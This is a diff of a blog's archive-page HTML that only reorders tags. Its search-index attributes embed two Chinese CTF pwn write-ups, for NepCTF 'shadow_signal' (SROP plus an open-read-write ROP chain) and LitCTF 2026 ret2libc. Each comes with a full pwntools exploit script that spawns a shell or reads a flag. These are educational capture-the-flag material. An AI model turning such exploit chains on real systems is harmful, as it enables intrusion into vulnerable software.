@@ -293,7 +293,7 @@
         <div class="archive-list" id="archive-list">
             
             
-            <div class="timeline" data-search="nepctfshadow_signalctfpwnpwn栈shellcodesroporw前置知识：sa_handler是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。sigemptyset(&amp;act.sa_mask);sa_mask表示：当handler正在执行时，临时屏蔽哪些信号。act.sa_handler=handler是什么意思？sa_handler是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。sigemptyset，就是把集合清空：不额外屏蔽其他信号sa_handler：act.sa_handler=(__sighandler_t)handler;意思是配置“信号来了以后调用哪个函数”。linux处理信号时，会在用户栈上布置一个信号帧。这个信号帧里不只是保存寄存器，还会安排一个“返回地址”。当signalhandler执行完ret时，它不是直接回到原来崩溃指令，而是先回到这个restorer。这道题主要用到的方法shellcode，srop，orw这里的保护不过多赘述了然后放入ida查看发现有gift这里打印出来的是stdout偏移后的地址这里也就相当于给了libc基址了然后可以构造一下r.recvuntil(b&quot;gift:&quot;)leak=int(r.recvline().strip(),16)libc_base=leak-libc.sym[&quot;_io_2_1_stdout_&quot;]为什么减_io_2_1_stdout_？因为打印出来的stdout实际指向**libc里的file结构_io_2_1_stdout_。**泄露值是：libc_base+libc.sym[&quot;_io_2_1_stdout_&quot;]所以反过来：libc_base=leak-_io_2_1_stdout_有了libc基址之后我们就可以进行利用所有的libcgadgetreadsyscall；ret后面的read(0,&amp;buf,8u);puts(buf);这里主要输入一个错误地址，然后puts进行取地址的时候触发段错误11=sigsegv=段错误之后触发段错误之后sigaction(sig,act,oldact)的意思是：给某个信号注册处理函数。当程序收到sigsegv时，调用handler程序会去handler里面在handler里面可以看到明显的栈溢出但是后面的if函数这里的意思是如果返回地址被覆盖就结束程序所以我们要把返回地址填进去handler的返回地址指向libc里的signalrestorer代码而这个restorer代码里面有syscall也就是说，栈上的返回地址是一个地址值这里可以在gdb中进行调试查看当遇到段错误停下时可以输入下面的这个handlesigsegvnostopnoprintpass含义：nostopgdb不在sigsegv停下noprint不打印sigsegv信息pass把sigsegv传递给程序然后下断点查看返回地址这里通过泄露libc基址可以知道这个返回地址的偏移0x42520然后内核根据fakeframe恢复寄存器这时候我们需要把rsp切换到bss段frame=sigreturnframe(kernel=&quot;amd64&quot;)frame.rdi=0frame.rsi=bssframe.rdx=0x500frame.rsp=bssframe.rip=read_addr之后可以通过rop在libc里面搜索需要用到的poprdipoprsi等地址之后再构造寄存器链orw链rop=flat(pop_rax,2,pop_rdi,path_addr,pop_rsi,0,pop_rdx_rbx,0,0,syscall_ret,pop_rax,0,pop_rdi,3,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,pop_rax,1,pop_rdi,1,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,)之后就不用说了完整的exp#!/usr/bin/envpython3frompwnimport*context.arch=&quot;amd64&quot;context.log_level=&quot;info&quot;#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=elf(&quot;./shadow_signal&quot;)libc=elf(&quot;./libc.so.6&quot;)r=process([&quot;./ld-linux-x86-64.so.2&quot;,&quot;--library-path&quot;,&quot;.&quot;,&quot;./shadow_signal&quot;])r.recvuntil(b&quot;gift:&quot;)leak=int(r.recvline().strip(),16)libc_base=leak-libc.sym[&quot;_io_2_1_stdout_&quot;]log.success(&quot;stdoutleak=&quot;+hex(leak))log.success(&quot;libcbase=&quot;+hex(libc_base))#gdb.attach(r)bss=0x406000restorer=libc_base+0x42520read_addr=libc_base+libc.sym[&quot;read&quot;]pop_rdi=libc_base+0x2a3e5pop_rsi=libc_base+0x2be51pop_rdx_rbx=libc_base+0x904a9pop_rax=libc_base+0x45eb0syscall_ret=libc_base+0x91316path=b&quot;./flag&quot;path_addr=bss+0x300flag_buf=bss+0x380r.send(p64(0xdeadbeef))r.recvuntil(b&quot;signal\n&quot;)frame=sigreturnframe(kernel=&quot;amd64&quot;)frame.rdi=0frame.rsi=bssframe.rdx=0x500frame.rsp=bssframe.rip=read_addrpayload=b&quot;a&quot;*0x118payload+=p64(restorer)payload+=bytes(frame)r.send(payload)sleep(0.05)rop=flat(pop_rax,2,pop_rdi,path_addr,pop_rsi,0,pop_rdx_rbx,0,0,syscall_ret,pop_rax,0,pop_rdi,3,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,pop_rax,1,pop_rdi,1,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,)payload2=rop.ljust(0x300,b&quot;\x00&quot;)payload2+=pathpayload2+=b&quot;\x00&quot;r.send(payload2)data=r.recv(timeout=2)print(data.rstrip(b&quot;\x00&quot;).decode(&quot;latin-1&quot;,&quot;replace&quot;))r.interactive()如果要修改flag的位置可以修改path&#x3d;b”.&#x2f;flag”">
+            <div class="timeline" data-search="nepctfshadow_signalctfpwnshellcodesroporwpwn栈前置知识：sa_handler是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。sigemptyset(&amp;act.sa_mask);sa_mask表示：当handler正在执行时，临时屏蔽哪些信号。act.sa_handler=handler是什么意思？sa_handler是结构体里的一个字段，用来指定“收到信号后执行哪个函数”。sigemptyset，就是把集合清空：不额外屏蔽其他信号sa_handler：act.sa_handler=(__sighandler_t)handler;意思是配置“信号来了以后调用哪个函数”。linux处理信号时，会在用户栈上布置一个信号帧。这个信号帧里不只是保存寄存器，还会安排一个“返回地址”。当signalhandler执行完ret时，它不是直接回到原来崩溃指令，而是先回到这个restorer。这道题主要用到的方法shellcode，srop，orw这里的保护不过多赘述了然后放入ida查看发现有gift这里打印出来的是stdout偏移后的地址这里也就相当于给了libc基址了然后可以构造一下r.recvuntil(b&quot;gift:&quot;)leak=int(r.recvline().strip(),16)libc_base=leak-libc.sym[&quot;_io_2_1_stdout_&quot;]为什么减_io_2_1_stdout_？因为打印出来的stdout实际指向**libc里的file结构_io_2_1_stdout_。**泄露值是：libc_base+libc.sym[&quot;_io_2_1_stdout_&quot;]所以反过来：libc_base=leak-_io_2_1_stdout_有了libc基址之后我们就可以进行利用所有的libcgadgetreadsyscall；ret后面的read(0,&amp;buf,8u);puts(buf);这里主要输入一个错误地址，然后puts进行取地址的时候触发段错误11=sigsegv=段错误之后触发段错误之后sigaction(sig,act,oldact)的意思是：给某个信号注册处理函数。当程序收到sigsegv时，调用handler程序会去handler里面在handler里面可以看到明显的栈溢出但是后面的if函数这里的意思是如果返回地址被覆盖就结束程序所以我们要把返回地址填进去handler的返回地址指向libc里的signalrestorer代码而这个restorer代码里面有syscall也就是说，栈上的返回地址是一个地址值这里可以在gdb中进行调试查看当遇到段错误停下时可以输入下面的这个handlesigsegvnostopnoprintpass含义：nostopgdb不在sigsegv停下noprint不打印sigsegv信息pass把sigsegv传递给程序然后下断点查看返回地址这里通过泄露libc基址可以知道这个返回地址的偏移0x42520然后内核根据fakeframe恢复寄存器这时候我们需要把rsp切换到bss段frame=sigreturnframe(kernel=&quot;amd64&quot;)frame.rdi=0frame.rsi=bssframe.rdx=0x500frame.rsp=bssframe.rip=read_addr之后可以通过rop在libc里面搜索需要用到的poprdipoprsi等地址之后再构造寄存器链orw链rop=flat(pop_rax,2,pop_rdi,path_addr,pop_rsi,0,pop_rdx_rbx,0,0,syscall_ret,pop_rax,0,pop_rdi,3,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,pop_rax,1,pop_rdi,1,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,)之后就不用说了完整的exp#!/usr/bin/envpython3frompwnimport*context.arch=&quot;amd64&quot;context.log_level=&quot;info&quot;#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=elf(&quot;./shadow_signal&quot;)libc=elf(&quot;./libc.so.6&quot;)r=process([&quot;./ld-linux-x86-64.so.2&quot;,&quot;--library-path&quot;,&quot;.&quot;,&quot;./shadow_signal&quot;])r.recvuntil(b&quot;gift:&quot;)leak=int(r.recvline().strip(),16)libc_base=leak-libc.sym[&quot;_io_2_1_stdout_&quot;]log.success(&quot;stdoutleak=&quot;+hex(leak))log.success(&quot;libcbase=&quot;+hex(libc_base))#gdb.attach(r)bss=0x406000restorer=libc_base+0x42520read_addr=libc_base+libc.sym[&quot;read&quot;]pop_rdi=libc_base+0x2a3e5pop_rsi=libc_base+0x2be51pop_rdx_rbx=libc_base+0x904a9pop_rax=libc_base+0x45eb0syscall_ret=libc_base+0x91316path=b&quot;./flag&quot;path_addr=bss+0x300flag_buf=bss+0x380r.send(p64(0xdeadbeef))r.recvuntil(b&quot;signal\n&quot;)frame=sigreturnframe(kernel=&quot;amd64&quot;)frame.rdi=0frame.rsi=bssframe.rdx=0x500frame.rsp=bssframe.rip=read_addrpayload=b&quot;a&quot;*0x118payload+=p64(restorer)payload+=bytes(frame)r.send(payload)sleep(0.05)rop=flat(pop_rax,2,pop_rdi,path_addr,pop_rsi,0,pop_rdx_rbx,0,0,syscall_ret,pop_rax,0,pop_rdi,3,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,pop_rax,1,pop_rdi,1,pop_rsi,flag_buf,pop_rdx_rbx,0x100,0,syscall_ret,)payload2=rop.ljust(0x300,b&quot;\x00&quot;)payload2+=pathpayload2+=b&quot;\x00&quot;r.send(payload2)data=r.recv(timeout=2)print(data.rstrip(b&quot;\x00&quot;).decode(&quot;latin-1&quot;,&quot;replace&quot;))r.interactive()如果要修改flag的位置可以修改path&#x3d;b”.&#x2f;flag”">
                 <div class="timeline-tail"></div>
                 <div class="timeline-content">
                     <div class="item-time">2026/7/21</div>
@@ -318,18 +318,6 @@
                             </span>
                             
                             <span class="tag">
-                                <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
-                                    Pwn
-                                </a>
-                            </span>
-                            
-                            <span class="tag">
-                                <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
-                                    栈
-                                </a>
-                            </span>
-                            
-                            <span class="tag">
                                 <a href="/tags/shellcode/" data-tag-name="shellcode" data-tag-color-role="text">
                                     shellcode
                                 </a>
@@ -344,6 +332,18 @@
                             <span class="tag">
                                 <a href="/tags/orw/" data-tag-name="orw" data-tag-color-role="text">
                                     orw
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
+                                    Pwn
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
+                                    栈
                                 </a>
                             </span>
                             
@@ -403,7 +403,7 @@
             </div>
             
             
-            <div class="timeline" data-search="litctf2026-ret2libcctfpwn基础题ret2libcpwn栈题目地址这道题还是挺简单的挺适合初学者做的前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2f;bin&#x2f;sh”字符串作为参数，从而获得一个shell。想要进阶的理解的话可以看这个深入理解ret2libc技术-先知社区最基础的ret2libc甚至还给了pop_rdileak_valuechecksec一下ida一下发现这里有现成的可以利用的rdiret还有泄露地址的地方然后第一部分溢出之后然后泄露地址然后返回main函数，接受地址之后计算libc基址，然后溢出之后再binshfrompwnimport*context(os=&quot;linux&quot;,arch=&quot;amd64&quot;)elf=elf(&quot;./ret2libc&quot;)libc=elf(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io=process(&quot;./ret2libc&quot;)#io=remote(&quot;challenge.cyclens.tech&quot;,30528)pop_rdi=0x4011b7ret=0x4011b8leak_value=0x4011c3main_addr=0x401234offset=72payload=b&quot;a&quot;*offsetpayload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(elf.got[&quot;puts&quot;])payload+=p64(leak_value)payload+=p64(ret)payload+=p64(main_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.recvuntil(b&quot;leak:&quot;)puts_addr=int(io.recvline().strip(),16)print(&quot;puts_addr=&quot;,hex(puts_addr))libc_base=puts_addr-libc.sym[&quot;puts&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]binsh_addr=libc_base+next(libc.search(b&quot;/bin/sh\x00&quot;))print(&quot;libc_base=&quot;,hex(libc_base))print(&quot;system_addr=&quot;,hex(system_addr))print(&quot;binsh_addr=&quot;,hex(binsh_addr))payload=b&quot;a&quot;*offsetpayload+=p64(pop_rdi)payload+=p64(binsh_addr)payload+=p64(ret)payload+=p64(system_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.interactive()">
+            <div class="timeline" data-search="litctf2026-ret2libcctfpwnpwn栈基础题ret2libc题目地址这道题还是挺简单的挺适合初学者做的前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2f;bin&#x2f;sh”字符串作为参数，从而获得一个shell。想要进阶的理解的话可以看这个深入理解ret2libc技术-先知社区最基础的ret2libc甚至还给了pop_rdileak_valuechecksec一下ida一下发现这里有现成的可以利用的rdiret还有泄露地址的地方然后第一部分溢出之后然后泄露地址然后返回main函数，接受地址之后计算libc基址，然后溢出之后再binshfrompwnimport*context(os=&quot;linux&quot;,arch=&quot;amd64&quot;)elf=elf(&quot;./ret2libc&quot;)libc=elf(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)io=process(&quot;./ret2libc&quot;)#io=remote(&quot;challenge.cyclens.tech&quot;,30528)pop_rdi=0x4011b7ret=0x4011b8leak_value=0x4011c3main_addr=0x401234offset=72payload=b&quot;a&quot;*offsetpayload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(elf.got[&quot;puts&quot;])payload+=p64(leak_value)payload+=p64(ret)payload+=p64(main_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.recvuntil(b&quot;leak:&quot;)puts_addr=int(io.recvline().strip(),16)print(&quot;puts_addr=&quot;,hex(puts_addr))libc_base=puts_addr-libc.sym[&quot;puts&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]binsh_addr=libc_base+next(libc.search(b&quot;/bin/sh\x00&quot;))print(&quot;libc_base=&quot;,hex(libc_base))print(&quot;system_addr=&quot;,hex(system_addr))print(&quot;binsh_addr=&quot;,hex(binsh_addr))payload=b&quot;a&quot;*offsetpayload+=p64(pop_rdi)payload+=p64(binsh_addr)payload+=p64(ret)payload+=p64(system_addr)io.recvuntil(b&quot;tellmeyourname:&quot;)io.send(payload)io.interactive()">
                 <div class="timeline-tail"></div>
                 <div class="timeline-content">
                     <div class="item-time">2026/5/23</div>
@@ -428,18 +428,6 @@
                             </span>
                             
                             <span class="tag">
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%E9%A2%98/" data-tag-name="基础题" data-tag-color-role="text">
-                                    基础题
-                                </a>
-                            </span>
-                            
-                            <span class="tag">
-                                <a href="/tags/ret2libc/" data-tag-name="ret2libc" data-tag-color-role="text">
-                                    ret2libc
-                                </a>
-                            </span>
-                            
-                            <span class="tag">
                                 <a href="/tags/Pwn/" data-tag-name="Pwn" data-tag-color-role="text">
                                     Pwn
                                 </a>
@@ -448,6 +436,18 @@
                             <span class="tag">
                                 <a href="/tags/%E6%A0%88/" data-tag-name="栈" data-tag-color-role="text">
                                     栈
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/%E5%9F%BA%E7%A1%80%E9%A2%98/" data-tag-name="基础题" data-tag-color-role="text">
+                                    基础题
+                                </a>
+                            </span>
+                            
+                            <span class="tag">
+                                <a href="/tags/ret2libc/" data-tag-name="ret2libc" data-tag-color-role="text">
+                                    ret2libc
                                 </a>
                             </span>
                             
